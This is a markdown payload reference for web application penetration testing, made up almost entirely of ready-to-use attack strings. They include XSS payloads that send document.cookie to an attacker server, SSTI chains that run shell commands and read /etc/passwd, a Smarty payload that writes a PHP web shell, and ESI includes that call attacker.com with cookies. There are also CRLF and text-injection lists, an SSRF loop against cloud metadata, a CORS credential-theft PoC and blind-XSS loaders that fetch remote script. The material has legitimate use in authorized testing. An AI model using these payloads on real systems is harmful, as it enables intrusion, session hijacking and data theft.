# payloads.md — Extended payload reference
# Complements the scenario batteries. Reach for it when the obvious
# payloads are exhausted. All payloads are UNVERIFIED_REFERENCE until
# proven on the live target with your own evidence — a payload list is
# never a finding. OAST-carrying payloads point ONLY at callback
# infrastructure you control. The bash snippets are POSIX shell
# (Linux/macOS/WSL/Git Bash).

---

## XSS — All Payloads

```
<img src=https://google.com/file.png onerror=alert("onerror")>
<script>alert("Hi!")</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(document.location)</script>
<svg onload=alert("onload")>
<svg onload=alert`onload`>
<p onclick=alert()> click </p>
<p onmouseover=prompt()> hover </p>
<svg onload=alert(onload)>
<svg onload=prompt(onload)>
<svg onload=confirm(onload)>
```

### Break out of HTML context

```
hello'</h1><svg onload=alert()><!--
x'</h1><svg onload=alert()><!--
ABCD"</h1><svg onload=alert("xss")>
This is my comment</p><svg onload=alert()><!--
```

### JS string context (angle brackets HTML-encoded)

```
tester'; alert("Well done");//
```

### innerHTML sink (angle brackets work, script tags blocked)

```
<u><img src=RANDOM onerror=alert("Hi")></u>
<u><svg onload=alert("Hi")></u>
```

### jQuery href sink

```
javascript:alert(document.cookie)
javascript:alert('xss')
javascript:confirm('xss')
```

### jQuery hashchange sink — deliver via iframe

```
<iframe src="https://LAB-HOST/#" onload="this.src += '<img src=x onerror=print()>'" hidden="hidden"></iframe>
```

### Attribute injection — break out of value=""

```
" onclick="alert()
" onclick="alert()""
" onclick='alert()' "
```

### Stored — anchor href with double quotes HTML-encoded

```
javascript:alert("xss")
```

### XSS exploit — cookie exfil via fetch to your server

```html
<script>
fetch('https://YOUR-SERVER',{
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```

### fake param XSS

```
?realparam=1&foo=bar'+alert(/XSS/)+'
```

### File upload — SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

### File upload — PDF (edit raw content in the request body)

```
%PDF-1.7
 1. 0 obj
 <</Pages 1 0 R /OpenAction 2 0 R>>
 2. 0 obj
 <</S /JavaScript /JS (app.alert(1))
 >> trailer <</Root 1 0 R>>
```

### Email field XSS

```
test+(<script>alert(0)</script>@example.com
"<img/src/onerror=alert(0)"@xss.com
["');alert('XSS');//"]@xss.com
test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
```

### XSS payloads (raw list)

```
"><img src=x onerror=alert(document.domain)>
<img src/onerror=prompt(document.cookie)>
<iframe src="javascript:alert(document.cookie)"></iframe>
<svg onload=prompt(document.cookie);>
%3Csvg%2Fonload%3Dprompt%28document.cookie%29%3B%3E
%253Csvg%252Fonload%253Dprompt%2528document.cookie%2529%253B%253E
'"><u>researcher</u>
"><svg/onload=confirm(document.cookie)>"@x.y
test@gmail.com'"><svg/onload=confirm(1)>
```

### JavaScript protocol variants

```
javascript://%0aalert()
javascript:/**/%0aalert()
JavaScript:confirm()
JavaScript://%250alert(1)//?1
JavaScript://%250A1?alert(1):0
JavaScript://%E2%80%A9alert(1)//?1
/file.svg?url=https://brutelogic.com.br/poc.svg
javascript%3A%2F%2F%250Aalert%281%29
javascript%3A%2561lert%281%29 javascript%3A%7B+alert%600%60+%7D
```

### Common vulnerable URL parameter patterns

```
/index.php?a=search&keyword=
/index.php?a=downloads&b=search&desc=1&keyword=
/index.php?a=downloads&b=search&keyword=
/index.php?a=shop&b=search&keyword=
/index.php?a=downloads&b=search&in=&keyword=
```

### OR >> context breakout

```
">+alert(1)//
```

### ISO-2022-JP charset trick

```
https://portswigger-labs.net/xss/charset.php?x=%3Ca%20href=javas%1B(Jcript:alert(1)%3Etest%3C/a%3E&charset=iso-2022-jp
```

### Misc tag / element tricks

```
<iframe/srcdoc="alert('XSS')"></iframe>
<embed/src='javascript:alert("XSS")'>
<<s>script>alert("XSS")<<s>/script>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
(File name) "><img src=x onerror=alert(document.domain)>.png
"><img src="/" =_=" title="onerror='prompt(document.cookie)'">.png
<img src/onerror=prompt(document.cookie)>
"/></script><script>alert(document.domain)</script>
"></a></tr></td></div><img src=0 onerror=prompt();>
--><img src=0 onerror=prompt();><!--
test"><img src=x on0x=1 onerror=print``>
<img src=javascript:prompt``>
<svg/Onload=confirm``>
<customtag onfocus=alert(1) autofocus tabindex=1>
<scr<script>ipt>alert('XSS')</script>
'"><svg/onload=prompt(5);>{{7*7}}
<i/oncut=alert()> (CTRL+X)
<svg/onload=alert()
img/src=x onerror=/*--*/alert()
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
%22})))}catch(e){alert(document.domain);}//
"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
"a")(({type:"ready"}));}catch(e){alert(1)}//
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<script> alert``  </script>
<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
"onmous%25%37%34eover=alert(document.cookie)>123
<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">Click Here</a>
'-alert(1)-'
'/alert(1)//'
<Img Src=OnXSS OnError=confirm(1)>
<img src="a" onerror='eval(atob("cHJvbXB0KDEpOw=="))'>
<Base Href=//X55.is?>
</Script><Script Src=//X55.is?>
<Svg Id=//X55.is OnLoad=import(id)>
<Img Src=//X55.is OnLoad=import(src)>
<script Src=https://www.googleapis.com/customsearch/v1?callback=alert(1)>
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
<scr<script>ipt>alert(1);</scr<script>ipt>
<%2Fstyle><%2Fscript><script>alert%28"XSS"%29<%2Fscript>
%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx3aalert%281%29
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" fill="red" onmouseover="fetch('/profile/delete')"/></svg>
<a href="java&Tab;script&colon;alert(1)">Click Me (Works in Chrome)</a>
<img src=x onauxclick="navigator.sendBeacon('https://YOUR-SERVER', document.cookie)">
<script>const payload = 'alert("CSP Bypassed")';setTimeout(eval, 100, payload);</script>
{{x = {'y':''.constructor.prototype}; x.y.z = alert; x.y.z('XSS') }}
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e\');confirm(1);//
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
$.get('http://sakurity.com/jqueryxss')
```

### Encoding note

```
>> try encoding with octal, unicode, hex, base64
```

### Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e\');confirm(1);//
```

### XSS with iframe name injection

```html
<iframe src="https://TARGET/?url=javascript:name" name="<svg/onload=alert(90)>">
</iframe>
```

### Bypass Cloudflare via CDATA (SVG upload)

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

### null bytes

```
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

### zero-width / invisible char payloads

```
<svg/onload=alert()
img/src=x onerror=/*--*/alert()
<i/oncut=alert()> (CTRL+X)
```

### SSTI-style XSS probe (context confusion)

```
${alert(document.domain)}
```

---

## SSTI — All Engine Payloads

### Detection probes

```
{{5*5}}
${7*7}
<%= 7*7 %>
{{5*5}} ${7*7} <%= 7*7 %>
{{2*2}}
{{3*3}}
${{6*6}}
<%= 3 * 3 %>
"<%=7 * 7 %>"@example.com
```

### Polyglot

```
${{<%[%'"}}%\
```

### FreeMarker (Java)

```
${7*7}
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Java (Spring / Generic SpEL / EL)

```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
```

### Twig (PHP)

```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{_self.env.setCache("ftp://YOUR-SERVER:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

### Smarty (PHP)

```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Handlebars (NodeJS) — RCE chain

```
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

### Velocity (Java)

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### ERB (Ruby)

```
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### Django (Python)

```
{% debug %}
{{settings.SECRET_KEY}}
```

### Tornado (Python)

```
{% import foobar %} = Error (confirms Tornado)
{% import os %}{{os.system('whoami')}}
```

### Mojolicious (Perl)

```
<%= perl code %>
<% perl code %>
```

### Flask / Jinja2 (Python) — identify

```
{{ '7'*7 }}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
```

### Flask / Jinja2 (Python) — exploit

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

### Jade / Pug (NodeJS)

```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

### Razor (.NET)

```
@(1+2)
@{// C# code}
```

### Extra detection probes (mixed)

```
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.items() }}
{{ [].class.base.subclasses() }}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
{% for key, value in config.iteritems() %}{{ key }}: {{ value }}{% endfor %}
```

---

## CRLF Injection — Full List

```
/%%0a0aSet-Cookie:crlf
/%0aSet-Cookie:crlf
/%0d%0aSet-Cookie:crlf
/%0dSet-Cookie:crlf
/%23%0aSet-Cookie:crlf
/%23%0d%0aSet-Cookie:crlf
/%23%0dSet-Cookie:crlf
/%25%30%61Set-Cookie:crlf
/%25%30aSet-Cookie:crlf
/%250aSet-Cookie:crlf
/%25250aSet-Cookie:crlf
/%2e%2e%2f%0d%0aSet-Cookie:crlf
/%2f%2e%2e%0d%0aSet-Cookie:crlf
/%2F..%0d%0aSet-Cookie:crlf
/%3f%0d%0aSet-Cookie:crlf
/%3f%0dSet-Cookie:crlf
/%u000aSet-Cookie:crlf
/%E5%98%8D%E5%98%8ASet-Cookie:crlf
```

---

## SSI — Full Directive List

```
<!--#directive param="value" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/index.html" -->
<!--#include file="file_to_include.html" -->
<!--#include virtual="/cgi-bin/counter.pl" -->
<!--#include virtual="file_to_include.html" -->
<!--#flastmod file="index.html" -->
<!--#exec cmd="dir" -->
<!--#exec cmd="ls" -->
<!--#exec cmd="whoami" -->
<!--#printenv -->
<!--#set var="name" value="Rich" -->
```

## ESI — Edge Side Includes

```
hell<!--esi-->o
<esi:include src=http://attacker.com>
<esi:include src=http://attacker.com/XSSPAYLOAD.html>
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>
<esi:include src="supersecret.txt">
<esi:debug/>
```

---

## Text Injection — Payloads

```
///--------------------------https://evil.com---------------------
/search?q="This page isn't available plz visit https://evil.com"
/%2f../--------------------------https://evil.com---------------------
/wp-login.php?error=Site has been hacked plz visit evil.com
#evil.com and fill your details
```

## Text Injection — Bash Mass-Test Script (POSIX shell)

```bash
#!/bin/bash
if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <file_of_domains>"
    exit 1
fi

input_file="$1"
output_file="textinjection.txt"

payloads=(
    "/--------------------------https://evil.com---------------------"
    "/search?q=\"This page isn't available plz visit https://evil.com\""
    "/%2f../--------------------------https://evil.com---------------------"
    "/wp-login.php?error=Site has been hacked plz visit evil.com"
    "#evil.com and fill your details"
)

> "$output_file"

while IFS= read -r domain; do
    for payload in "${payloads[@]}"; do
        echo "$domain$payload" >> "$output_file"
    done
done < "$input_file"

echo "Modified domains saved to $output_file"
```

---

## SSRF — Mass Param Test Loop (POSIX shell)

```bash
for host in $(cat hosts.txt); do
  for raw_path in $(cat endpoint_path.txt); do
    path=$(echo "$raw_path" | sed 's/?.*//' | sed 's|^/*|/|')
    for param in $(cat ssrf_params.txt); do
      echo "http://$host$path/getdata.jsp?$param=http://169.254.169.254/latest/meta-data/"
    done
  done
done | httpx -silent -status-code -content-length
```

## SSRF — Callback / Pingback Server Alternatives

```
interactsh.com
ceye.io
requestcatcher.com
canarytokens.org
webhook.site
ngrok.com
pingb.in
requestbin.net
ssrftest.com
rbnd.gl0.eu
dnslog.cn
beeceptor.com
```

---

## CORS — Full Origin Payload List

```
Origin: https://evil.com
Origin: null
Origin: hacker.com?.victim.com
Origin: example.com.hacker.com
Origin: wwwexample.com
Origin: hacker.com/example.com
Origin: hacker.com%25%32%33@www.example.com
Origin: hacker.com%23@www.example.com
Origin: sub.eviltarget.com
Origin: https://burpcollaborator.net
Origin: victim.com.evil.com
Origin: evilexample.com
Origin: http://stock.target.com
```

## CORS — Styled PoC HTML Template

```html
<!DOCTYPE html>
<html>
   <head>
      <style>#name { font-size: 2em; font-weight: bold; text-align: center; }</style>
      <script>
         function cycleColors() {
            const colors = ["red","blue","green","yellow","orange","purple","cyan"];
            let index = 0;
            const nameElement = document.getElementById("name");
            setInterval(() => { nameElement.style.color = colors[index]; index = (index+1) % colors.length; }, 500);
         }
      </script>
   </head>
   <body onload="cycleColors()">
      <center>
         <h2>CORS PoC Exploit</h2>
         <h3 id="name">CORS PoC</h3>
         <h3>Show full content of page</h3>
         <div id="demo"><button type="button" onclick="cors()">Exploit</button></div>
      </center>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                   document.getElementById("demo").innerHTML = this.responseText;
                }
            };
            xhttp.open("GET", "https://TARGET.com/accountDetails", true);
            xhttp.withCredentials = true;
            xhttp.send();
         }
      </script>
   </body>
</html>
```

---

## BLIND XSS — collector patterns
# Fire ONE payload per distinct surface, after a syntactically valid
# value so storage accepts it. Replace YOUR-COLLECTOR with a blind-XSS
# collector you control (self-hosted or a service you registered);
# confirmation = a hit in YOUR collector log that matches the target
# surface. Self-XSS-only contexts are never reportable.

### Basic script-tag payload

```
"><script src="https://YOUR-COLLECTOR"></script>
```

### javascript: URI payload

```
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://YOUR-COLLECTOR\';document.body.appendChild(a)')
```

### input-tag payload (base64 in id — regenerate the base64 of the
### loader for YOUR collector URL)

```
"><input onfocus=eval(atob(this.id)) id=BASE64-OF-LOADER autofocus>
```
where BASE64-OF-LOADER = base64("var a=document.createElement('script');a.src='https://YOUR-COLLECTOR';document.body.appendChild(a)")

### img-tag payload (same base64 pattern)

```
"><img src=x id=BASE64-OF-LOADER onerror=eval(atob(this.id))>
```

### video/source-tag payload

```
"><video><source onerror=eval(atob(this.id)) id=BASE64-OF-LOADER>
```

### XMLHttpRequest chainload

```
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://YOUR-COLLECTOR");a.send();</script>
```

### jQuery getScript (sites with jQuery)

```
<script>$.getScript("https://YOUR-COLLECTOR")</script>
```

---

**NOTICE:** Use contextually-aware output encoding. Only you can prevent
payload fires. Or don't, I'm not an XSS cop. (Forked from the original
author: @IAmMandatory.)
